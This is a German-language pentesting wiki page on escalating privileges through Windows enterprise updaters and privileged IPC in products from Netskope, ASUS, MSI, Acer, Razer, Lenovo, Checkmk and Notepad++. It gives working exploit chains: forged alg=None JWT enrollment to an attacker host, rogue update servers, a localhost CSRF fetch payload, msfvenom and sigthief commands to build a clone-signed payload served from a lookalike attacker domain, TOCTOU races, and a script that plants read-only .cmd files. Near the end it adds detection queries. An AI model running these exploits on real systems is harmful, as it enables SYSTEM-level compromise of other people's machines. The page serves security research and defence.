# Missbrauch von Enterprise Auto-Updaters und Privileged IPC (z.B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows local privilege escalation-Chains, die in enterprise endpoint agents und updaters gefunden wurden und eine low-friction IPC-Oberfläche sowie einen privilegierten Update-Flow bereitstellen. Ein repräsentatives Beispiel ist Netskope Client for Windows < R129 (CVE-2025-0309), bei dem ein low-privileged user die Enrollment in einen vom Angreifer kontrollierten Server erzwingen und dann ein bösartiges MSI bereitstellen kann, das der SYSTEM service installiert.

Wesentliche Ideen, die du gegen ähnliche Produkte wiederverwenden kannst:
- Missbrauche die localhost IPC eines privilegierten service, um eine erneute enrollment oder Reconfiguration auf einen Angreifer-Server zu erzwingen.
- Implementiere die Update-Endpunkte des Vendors, liefere eine rogue Trusted Root CA aus und zeige den Updater auf ein bösartiges, „signed“ package.
- Umgehe schwache Signer-Checks (CN allow-lists), optionale Digest-Flags und lockere MSI-Properties.
- Wenn IPC „encrypted“ ist, leite den Key/IV aus world-readable machine identifiers ab, die in der registry gespeichert sind.
- Wenn der service Caller nach image path/process name einschränkt, injiziere in einen allow-listed process oder starte einen im suspended Zustand und bootstrape deine DLL über einen minimalen thread-context patch.

---
## 1) Erzwingen der enrollment zu einem Angreifer-Server via localhost IPC

Viele Agents liefern einen UI-Prozess im user mode, der über localhost TCP mittels JSON mit einem SYSTEM service kommuniziert.

Beobachtet in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-Flow:
1) Erzeuge ein JWT enrollment token, dessen Claims den backend host kontrollieren (z.B. AddonUrl). Verwende alg=None, damit keine Signatur erforderlich ist.
2) Sende die IPC-Nachricht, die den provisioning command mit deinem JWT und tenant name aufruft:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Der Dienst beginnt, deinen rogue server für enrollment/config zu kontaktieren, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Wenn caller verification pfad-/namensbasiert ist, starte die Anfrage von einem allow-listed vendor binary aus (siehe §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Sobald der client mit deinem server spricht, implementiere die erwarteten endpoints und leite ihn zu einer attacker MSI. Typische Sequenz:

1) /v2/config/org/clientconfig → Gib JSON config mit einem sehr kurzen updater interval zurück, z. B.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Gibt ein PEM CA-Zertifikat zurück. Der Dienst installiert es in den Local Machine Trusted Root store.
3) /v2/checkupdate → Liefert Metadaten mit Verweis auf eine bösartige MSI und eine Fake-Version.

Umgehung gängiger Checks, die in der Wildnis gesehen werden:
- Signer CN allow-list: der Dienst prüft möglicherweise nur, ob der Subject CN „netSkope Inc“ oder „Netskope, Inc.“ entspricht. Deine Rogue CA kann ein Leaf mit diesem CN ausstellen und die MSI signieren.
- CERT_DIGEST property: füge eine harmlose MSI-Property namens CERT_DIGEST ein. Keine Durchsetzung bei der Installation.
- Optional digest enforcement: config flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Ergebnis: Der SYSTEM-Dienst installiert deine MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt beliebigen Code als NT AUTHORITY\SYSTEM aus.

Patch-bypass lesson: Wenn ein Vendor darauf mit einer allow-list für eine kleine Menge „vertrauenswürdiger“ Domains reagiert, statt die Update-Quelle kryptografisch zu authentifizieren, suche nach Vendor-eigenen Redirectors oder Reverse Proxies, die es dir trotzdem erlauben, Traffic zu steuern. Im Fall von Netskope zeigte öffentliche Nachfolgeforschung, dass eine Allow-list aus der R129-Ära weiterhin über `rproxy.goskope.com` missbraucht werden konnte, das vom Angreifer kontrollierte Azure App Service-Inhalte proxied. Behandle Hostname allow-lists als Speed Bump, nicht als Trust Boundary.

---
## 3) Verschlüsselte IPC Requests fälschen (falls vorhanden)

Ab R127 verpackte Netskope IPC-JSON in ein encryptData-Feld, das wie Base64 aussieht. Reverse Engineering zeigte AES mit Key/IV, die aus Registry-Werten abgeleitet werden und für jeden Benutzer lesbar sind:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung reproduzieren und gültige verschlüsselte Commands von einem Standardbenutzer senden. Allgemeiner Tipp: Wenn ein Agent plötzlich sein IPC „verschlüsselt“, suche unter HKLM nach Device IDs, Product GUIDs und Install IDs als Material.

---
## 4) IPC Caller allow-lists umgehen (Path/Name-Checks)

Einige Dienste versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Verbindung auflösen und den Image-Pfad/-Namen mit allow-listed Vendor-Binaries unter Program Files vergleichen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungen:
- DLL injection in einen allow-listed Prozess (z. B. nsdiag.exe) und IPC von dort aus proxyen.
- Starte ein allow-listed Binary suspended und bootstrappe deine Proxy-DLL ohne CreateRemoteThread (siehe §5), um driver-enforced tamper rules zu erfüllen.

---
## 5) Tamper-protection-freundliche Injection: suspended process + NtContinue patch

Produkte bringen oft einen minifilter/OB callbacks driver (z. B. Stadrv) mit, um gefährliche Rechte von Handles zu geschützten Prozessen zu entfernen:
- Process: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User-Mode-Loader, der diese Einschränkungen respektiert:
1) CreateProcess eines Vendor-Binaries mit CREATE_SUSPENDED.
2) Hole Handles, die du noch benutzen darfst: PROCESS_VM_WRITE | PROCESS_VM_OPERATION auf dem Process und ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du Code an einem bekannten RIP patchst).
3) Überschreibe ntdll!NtContinue (oder einen anderen frühen, garantiert gemappten thunk) mit einem kleinen Stub, der LoadLibraryW auf deinen DLL-Pfad aufruft und dann zurückspringt.
4) ResumeThread, um deinen Stub im Prozess auszulösen und deine DLL zu laden.

Da du auf einem bereits geschützten Prozess nie PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME verwendet hast (du hast ihn selbst erstellt), ist die Policy des Drivers erfüllt.

---
## 6) Praktische Tooling
- NachoVPN (Netskope plugin) automatisiert eine Rogue CA, das Signieren bösartiger MSI und bedient die benötigten Endpunkte: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ist ein benutzerdefinierter IPC-Client, der beliebige (optional AES-verschlüsselte) IPC-Nachrichten erstellt und die suspended-process injection enthält, um von einem allow-listed Binary aus zu stammen.

## 7) Schneller Triage-Workflow für unbekannte Updater-/IPC-Oberflächen

Wenn du einem neuen Endpoint-Agenten oder einer Motherboard-„Helper“-Suite gegenüberstehst, reicht meist ein schneller Workflow, um zu erkennen, ob es sich um ein vielversprechendes privesc-Ziel handelt:

1) Loopback-Listener enumerieren und zu Vendor-Prozessen zurückverfolgen:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Kandidaten für Named Pipes aufzählen:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Sammle registry-gestützte Routing-Daten, die von plugin-basierten IPC-Servern verwendet werden:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrahiere zuerst Endpoint-Namen, JSON-Keys und Command-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends geben häufig das vollständige Schema preis:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Suche nach dem eigentlichen trust predicate, nicht nur nach dem Codepfad, der schließlich den Prozess startet:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Muster, die sich priorisieren lassen:
- `CryptQueryObject`/Zertifikats-Parsing ohne `WinVerifyTrust` bedeutet meist, dass „Zertifikat existiert“ als „Zertifikat ist vertrauenswürdig“ behandelt wurde, was Certificate Cloning oder andere Fake-Signer-Tricks ermöglicht.
- Substring-/Suffix-Prüfungen auf `Origin`, `Referer`, Download-URLs, Prozessnamen oder Signer-CNs sind keine Authentifizierung. `contains(".vendor.com")` ist meist mit attacker-controlled Lookalike-Domains ausnutzbar.
- Wenn die GUI mit niedrigen Rechten entscheidet „die Datei ist vertrauenswürdig“ und der SYSTEM-Broker nur dieses Ergebnis verwendet, umgeht das Patchen oder Neuimplementieren der Client-seitigen DLL/JS oft die Grenze vollständig (Razer-Style Split Validation).
- Wenn der Broker ein Payload nach `%TEMP%`/`C:\Windows\Temp` kopiert und es dann von dort validiert oder plant, teste sofort auf TOCTOU-Replacement-Fenster und auf Sibling-Plugin-Module, die alternative `ExecuteTask()`-Wrapper mit schwächeren Checks bereitstellen.

Für Ziele mit viel Named-Pipe-Nutzung ist PipeViewer ein schneller Weg, schwache DACLs und remote erreichbare Pipes zu erkennen, bevor du mit dem tiefen Reversing des Protokolls beginnst.

Wenn der Zielprozess Aufrufer nur per PID, Image-Pfad oder Prozessname authentifiziert, behandle das als kleine Hürde statt als Grenze: Injektion in den legitimen Client oder die Verbindung aus einem allow-listed Prozess reicht oft aus, um die Checks des Servers zu erfüllen. Für Named Pipes behandelt [diese Seite über Client-Impersonation und Pipe-Abuse](named-pipe-client-impersonation.md) das Primitive detaillierter.

---
## 8) Modulare Add-in-Broker, die nur durch Vendor-Signaturen authentifiziert sind (Lenovo Vantage Pattern)

Eine neuere Variante, nach der es sich zu suchen lohnt, ist der **signed-client RPC broker**: Ein low-privileged, von Lenovo signierter Desktop-Prozess spricht mit einem SYSTEM-Dienst, und der Dienst routet JSON-Commands in eine Reihe von XML-beschriebenen Add-ins unter `%ProgramData%`. Sobald Code Execution **innerhalb eines beliebigen akzeptierten signierten Clients** erreicht ist, wird jeder `runas="system"`-Vertrag Teil deiner Attack Surface.

Hochwertige Primitive aus der Lenovo-Vantage-Research:
- **Dem Aufrufer vertrauen, weil er vom Vendor signiert ist**: Forscher erreichten einen authentifizierten Kontext, indem sie eine von Lenovo signierte EXE in ein beschreibbares Verzeichnis kopierten und ein DLL Side-Load (`profapi.dll`) erfüllten, sodass beliebiger Code innerhalb eines Clients lief, dem der Dienst bereits vertraute.
- **Manifest-gesteuerte Attack Surface Discovery**: Add-ins werden unter `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` deklariert; mehrere Verträge laufen als `SYSTEM`, daher offenbart das Auflisten dieser Manifeste oft die wirklich privilegierten Verben schneller als das Reverse Engineering des Brokers selbst.
- **Per-Command-Bugs hinter dem authentifizierten Kanal**: Sobald man im vertrauenswürdigen Client ist, fand Public Research Path Traversal + Race Conditions in Update-/Install-Verben, Raw-SQL-Missbrauch in privilegierten Settings-Datenbanken und Substring-basierte Registry-Pfadprüfungen, die Writes außerhalb des vorgesehenen Hives ermöglichten.

Nützliche Recon auf einem Ziel:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktische Erkenntnis: Immer wenn eine Helper-Suite einen Broker bereitstellt, der zuerst den **Caller Process** authentifiziert und erst danach in Dutzende von Plugin-/Add-in-Commands verzweigt, hör nicht nach dem Umgehen der Front-Door-Trust-Check auf. Dump die Manifest-/Contract-Tabelle und fuzz jeden High-Privilege-Verb separat; der authentifizierte Kanal verbirgt meist mehrere Second-Stage-Bugs.

---
## 1) Browser-to-localhost CSRF gegen privilegierte HTTP APIs (ASUS DriverHub)

DriverHub liefert einen User-Mode-HTTP-Service (ADU.exe) auf 127.0.0.1:53000 mit, der Browser-Calls von https://driverhub.asus.com erwartet. Der Origin-Filter führt einfach `string_contains(".asus.com")` auf dem Origin-Header und auf Download-URLs aus, die von `/asus/v1.0/*` exponiert werden. Jeder angreifergesteuerte Host wie `https://driverhub.asus.com.attacker.tld` besteht den Check daher und kann per JavaScript zustandsändernde Requests auslösen. Siehe [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) für zusätzliche Bypass-Muster.

Praktischer Ablauf:
1) Registriere eine Domain, die `.asus.com` einbettet, und hoste dort eine bösartige Webseite.
2) Nutze `fetch` oder XHR, um einen privilegierten Endpoint (z. B. `Reboot`, `UpdateApp`) auf `http://127.0.0.1:53000` aufzurufen.
3) Sende den vom Handler erwarteten JSON-Body – das gepackte Frontend-JS zeigt das Schema unten.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Sogar die unten gezeigte PowerShell-CLI ist erfolgreich, wenn der Origin-Header auf den vertrauenswürdigen Wert gespooft wird:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Jeder Besuch des Opfers auf der Angreifer-Website wird damit zu einem 1-Click- (oder 0-click via `onload`) lokalen CSRF, der einen SYSTEM Helper anstößt.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige Executables herunter, die im JSON-Body definiert sind, und cached sie in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Download-URL-Validierung verwendet dieselbe Substring-Logik, daher wird `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert. Nach dem Download prüft ADU.exe lediglich, ob das PE eine Signatur enthält und ob der Subject-String vor dem Ausführen ASUS entspricht – kein `WinVerifyTrust`, keine Chain-Validation.

Um den Flow zu weaponizen:
1) Ein Payload erstellen (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Den ASUS-Signer hineinklonen (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` auf einer `.asus.com`-Lookalike-Domain hosten und UpdateApp via dem oben genannten Browser-CSRF triggern.

Da sowohl die Origin- als auch die URL-Filter substring-basiert sind und der Signer-Check nur Strings vergleicht, zieht DriverHub die Angreifer-Binary und führt sie unter dem erhöhten Kontext aus.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Service von MSI Center stellt ein TCP-Protokoll bereit, bei dem jeder Frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` ist. Die Kernkomponente (Component ID `0f 27 00 00`) liefert `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Der Handler:
1) Kopiert das angegebene Executable nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifiziert die Signatur via `CS_CommonAPI.EX_CA::Verify` (Certificate Subject muss „MICRO-STAR INTERNATIONAL, CO., LTD.“ entsprechen und `WinVerifyTrust` muss erfolgreich sein).
3) Erstellt einen Scheduled Task, der die Temp-Datei als SYSTEM mit Angreifer-kontrollierten Argumenten ausführt.

Die kopierte Datei wird zwischen Verifikation und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A senden, der auf eine legitime MSI-signierte Binary zeigt (garantiert, dass der Signature-Check besteht und der Task queued wird).
- Das mit wiederholten Frame-B-Nachrichten racen, die auf ein bösartiges Payload zeigen und `MSI Center SDK.exe` direkt nach Abschluss der Verifikation überschreiben.

Wenn der Scheduler auslöst, führt er das überschriebenen Payload unter SYSTEM aus, obwohl die ursprüngliche Datei validiert wurde. Zuverlässige Ausnutzung nutzt zwei goroutines/Threads, die CMD_AutoUpdateSDK spammen, bis das TOCTOU-Fenster gewonnen ist.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Jedes Plugin/DLL, das von `MSI.CentralServer.exe` geladen wird, erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert ist. Die ersten 4 Bytes eines Frames wählen diese Komponente aus, sodass Angreifer Commands an beliebige Module routen können.
- Plugins können eigene Task Runner definieren. `Support\API_Support.dll` exponiert `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` und ruft direkt `API_Support.EX_Task::ExecuteTask()` mit **keiner Signaturvalidierung** auf – jeder lokale User kann es auf `C:\Users\<user>\Desktop\payload.exe` zeigen lassen und deterministisch SYSTEM-Ausführung bekommen.
- Das Sniffen von Loopback mit Wireshark oder das Instrumentieren der .NET-Binaries in dnSpy legt schnell das Component-↔-Command-Mapping offen; eigene Go-/Python-Clients können dann Frames replayen.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exponiert `\\.\pipe\treadstone_service_LightMode`, und seine Discretionary ACL erlaubt Remote Clients (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden von Command ID `7` mit einem Datei-Pfad ruft die Prozess-Spawn-Routine des Services auf.
- Die Client-Library serialisiert ein magisches Terminator-Byte (113) zusammen mit Args. Dynamische Instrumentierung mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Instrumentierungs-Tipps) zeigt, dass der native Handler diesen Wert auf ein `SECURITY_IMPERSONATION_LEVEL` und eine Integrity SID abbildet, bevor `CreateProcessAsUser` aufgerufen wird.
- Das Ersetzen von 113 (`0x71`) durch 114 (`0x72`) fällt in den generischen Branch, der das volle SYSTEM-Token behält und eine High-Integrity SID (`S-1-16-12288`) setzt. Die gestartete Binary läuft damit als uneingeschränktes SYSTEM, lokal und systemübergreifend.
- Kombiniert mit dem exponierten Installer-Flag (`Setup.exe -nocheck`) lässt sich ACC sogar auf Lab-VMs starten und die Pipe ohne Vendor-Hardware nutzen.

Diese IPC-Bugs zeigen, warum localhost-Services Mutual Authentication erzwingen müssen (ALPC SIDs, `ImpersonationLevel=Impersonation`-Filter, Token-Filtering) und warum jeder „run arbitrary binary“-Helper eines Moduls dieselben Signaturverifikationen teilen muss.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 hat ein weiteres nützliches Muster zu dieser Familie hinzugefügt: Ein niedrig privilegierter User kann einen COM-Helper bitten, einen Prozess über `RzUtility.Elevator` zu starten, während die Trust-Entscheidung an eine User-Mode-DLL (`simple_service.dll`) delegiert wird, statt robust innerhalb der privilegierten Grenze erzwungen zu werden.

Beobachteter Exploit-Pfad:
- Das COM-Objekt `RzUtility.Elevator` instanziieren.
- `LaunchProcessNoWait(<path>, "", 1)` aufrufen, um einen erhöhten Start anzufordern.
- Im öffentlichen PoC wird die PE-Signature-Gate in `simple_service.dll` vor dem Senden der Anfrage herausgepatcht, wodurch ein beliebiges, vom Angreifer gewähltes Executable gestartet werden kann.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Allgemeine Kernaussage: Beim Reversing von „helper“-Suites nicht bei localhost TCP oder named pipes aufhören. Nach COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility` suchen und dann prüfen, ob der privilegierte Service das Zielbinary selbst validiert oder lediglich einem Ergebnis vertraut, das von einer patchbaren user-mode client DLL berechnet wurde. Dieses Muster gilt über Razer hinaus: Jede Split-Design-Architektur, bei der der High-Privilege-Broker eine Allow/Deny-Entscheidung von der Low-Privilege-Seite übernimmt, ist eine potenzielle privesc-Angriffsfläche.


---
## Vorhersagbare Ausführung von Temp-Skripten während MSI repair (Checkmk Agent / CVE-2024-0670)

Einige Windows agents implementieren privilegierte Aktionen noch immer, indem sie ein temporäres `.cmd` nach `C:\Windows\Temp` schreiben und es als `SYSTEM` ausführen. Wenn der Dateiname vorhersagbar ist und der Service vorhandene Dateien nicht sicher neu anlegt, kann ein low-privileged user die zukünftige Temp-Datei als **read-only** vorab anlegen und den privilegierten Prozess dazu bringen, vom Angreifer kontrollierten Inhalt statt des eigenen Skripts auszuführen.

Beobachtet in verwundbaren Checkmk Agent-Builds:
- Temp-Muster: `cmk_all_<PID>_1.cmd`
- betroffene Branches: `2.0.0`, `2.1.0`, `2.2.0`
- Auslöser: MSI **repair** des gecachten Agent-Pakets

Praktischer Ablauf:
1. Einen realistischen PID-Bereich aus aktuellen Prozess-IDs oder dem laufenden Agent-PID abschätzen.
2. Ein kurzes **ASCII** `.cmd`-Payload schreiben (`Set-Content -Encoding Ascii` oder `cmd.exe`-Umleitung; UTF-16-PowerShell-Output für Batch-Dateien vermeiden).
3. `C:\Windows\Temp\cmk_all_<PID>_1.cmd` über den Kandidatenbereich verteilen und jede Datei read-only markieren.
4. Einen repair des gecachten MSI auslösen, damit der privilegierte Service versucht, das Temp-Skript neu zu erzeugen und es anschließend auszuführen.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Wenn das verwundbare Produkt mit Windows Installer installiert ist, ordne die zufällig aussehende gecachte MSI unter `C:\Windows\Installer` vor dem Auslösen der Repair wieder ihrem Produktnamen zu:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` ist nützlich, wenn `msiexec /fa` aus einer nicht-interaktiven WinRM-Shell fehlschlägt und du verstehen musst, ob eine vorhandene Desktop-/disconnected session die repair korrekt auslösen kann.
- Dieses Muster verallgemeinert sich auf andere endpoint agents und updaters, die **temp scripts in world-writable locations stagen und später als SYSTEM ausführen**. Prüfe auf vorhersehbare Namen, fehlende exclusive create semantics und repair/update flows, die on demand ausgelöst werden können.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Zwischen June 2025 und December 2025 servierten Angreifer, die die hosting infrastructure hinter dem Notepad++ update flow kompromittiert hatten, ausgewählten Opfern gezielt malicious manifests. Ältere WinGUp-basierte updaters verifizierten die update authenticity nicht vollständig, sodass eine feindliche XML response Clients auf attacker-controlled URLs umleiten konnte. Da der client HTTPS content akzeptierte, ohne sowohl eine trusted certificate chain als auch eine gültige PE signature für den heruntergeladenen installer zu erzwingen, luden Opfer ein trojanized NSIS `update.exe` herunter und führten es aus.

Operational flow (no local exploit required):
1. **Infrastructure interception**: CDN/hosting kompromittieren und update checks mit attacker metadata beantworten, die auf eine malicious download URL verweist.
2. **Trojanized NSIS**: der installer fetch/executes einen payload und missbraucht zwei execution chains:
- **Bring-your-own signed binary + sideload**: das signierte Bitdefender `BluetoothService.exe` bündeln und eine malicious `log.dll` in dessen search path ablegen. Wenn die signed binary ausgeführt wird, sideloadet Windows `log.dll`, das die Chrysalis backdoor entschlüsselt und reflectively lädt (Warbird-protected + API hashing, um static detection zu erschweren).
- **Scripted shellcode injection**: NSIS führt ein kompiliertes Lua script aus, das Win32 APIs (z. B. `EnumWindowStationsW`) verwendet, um shellcode zu injizieren und Cobalt Strike Beacon zu stagen.

Hardening/detection takeaways for any auto-updater:
- Erzwinge **certificate + signature verification** des heruntergeladenen installers (vendor signer pinnen, mismatched CN/chain verwerfen) und signiere das update manifest selbst (z. B. XMLDSig). Blockiere manifest-controlled redirects, sofern sie nicht validiert sind.
- Behandle **BYO signed binary sideloading** als post-download detection pivot: Alarm, wenn eine signierte vendor EXE eine DLL mit einem Namen außerhalb ihres kanonischen install path lädt (z. B. Bitdefender lädt `log.dll` aus Temp/Downloads) und wenn ein updater installer aus temp ablegt/ausführt, die keine vendor signatures haben.
- Überwache **malware-specific artifacts**, die in dieser chain beobachtet wurden (nützlich als generische pivots): mutex `Global\Jdhfv_1.0.1`, anomale `gup.exe` writes nach `%TEMP%`, und Lua-gesteuerte shellcode injection stages.
- Notepad++ reagierte, indem WinGUp in v8.8.9 und später gehärtet wurde: Das zurückgegebene XML ist jetzt signiert (XMLDSig), und neuere Builds erzwingen certificate + signature verification des heruntergeladenen installers, statt allein dem transport zu vertrauen.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Diese Muster lassen sich auf jeden updater verallgemeinern, der unsigned manifests akzeptiert oder Installer-Signer nicht pinnt—network hijack + malicious installer + BYO-signed sideloading führt zu remote code execution unter dem Deckmantel von „trusted“ Updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
